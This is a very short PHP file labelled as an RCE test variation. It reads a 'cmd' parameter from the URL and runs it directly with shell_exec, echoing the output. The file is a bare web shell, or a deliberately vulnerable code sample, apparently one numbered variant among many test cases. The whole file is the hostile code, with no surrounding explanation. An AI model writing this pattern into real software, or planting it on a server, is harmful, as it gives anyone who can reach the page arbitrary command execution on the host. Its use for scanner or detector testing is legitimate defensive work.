<?php
// RCE test variation #378
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>